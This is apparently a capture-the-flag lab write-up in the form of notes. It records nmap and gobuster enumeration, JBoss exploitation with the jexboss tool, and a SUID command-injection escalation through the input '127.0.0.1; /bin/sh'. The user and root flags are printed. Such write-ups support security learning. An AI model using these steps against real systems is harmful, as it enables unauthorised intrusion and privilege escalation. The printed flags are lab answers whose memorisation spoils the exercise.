```
export IP=10.10.91.18

Nmap 
---------------------------------
nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
| http-methods: 
|_  Supported Methods: POST
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
|_http-title: My first blog
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
1090/tcp open  java-rmi    syn-ack ttl 63 Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    syn-ack ttl 63 Java RMI
1099/tcp open  java-object syn-ack ttl 63 Java Object Serialization
3306/tcp open  mysql       syn-ack ttl 63 MariaDB (unauthorized)
4444/tcp open  java-rmi    syn-ack ttl 63 Java RMI
4445/tcp open  java-object syn-ack ttl 63 Java Object Serialization
4446/tcp open  java-object syn-ack ttl 63 Java Object Serialization
8009/tcp open  ajp13       syn-ack ttl 63 Apache Jserv (Protocol v1.3)
8080/tcp open  http        syn-ack ttl 63 Apache Tomcat/Coyote JSP engine 1.1
8083/tcp open  http        syn-ack ttl 63 JBoss service httpd
15373/tcp filtered unknown      no-response
16646/tcp filtered unknown      no-response
38758/tcp open     java-rmi     syn-ack ttl 63 Java RMI
42525/tcp filtered unknown      no-response
43923/tcp open     unknown      syn-ack ttl 63
44479/tcp filtered unknown      no-response
50184/tcp filtered unknown      no-response
50280/tcp filtered unknown      no-response
53768/tcp filtered unknown      no-response
---------------------------------

Gobuster
---------------------------------
PORT 80
gobuster -u http://$IP -w /usr/share/wordlists/DirBuster-Lists/directory-list-2.3-medium.txt -t 20 -o gobuster_init -x .txt,.php,.xls,.csv,.sql
/index.php (Status: 200)
/themes (Status: 301) => do check
/public (Status: 301)
/admin (Status: 301)
/plugins (Status: 403)
/db (Status: 403)
/cache (Status: 403)
/inc (Status: 403)
/LICENSE (Status: 200)
/var (Status: 403)
/CHANGELOG (Status: 200) => Must check
/CREDITS (Status: 200)
/locales (Status: 301)

PORT 8080
/images (Status: 302)
/css (Status: 302)
/status (Status: 200)
/manager (Status: 302)
---------------------------------

Hint : In port 8080, we found JBoss Web/2.1.1.GA
in port 80, dotclear

We used jexboss 

python jexboss.py -host http://$IP:8080

And accessing python jexboss.py -host http://target_host:8080 gives us our shell!!

user.txt
=====================================
f4d491f280de360cc49e26ca1587cbcc
=====================================

Finding SUID bits

find / -perm -u=s -type f 2>/dev/null
------------------------------------------------
/usr/bin/pingsys => Let's tinker with this
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
------------------------------------------------

/usr/bin/pingsys '127.0.0.1; /bin/sh' => this gives us our reverse shell!!

root.txt
================================
29a5641eaa0c01abe5749608c8232806
================================
```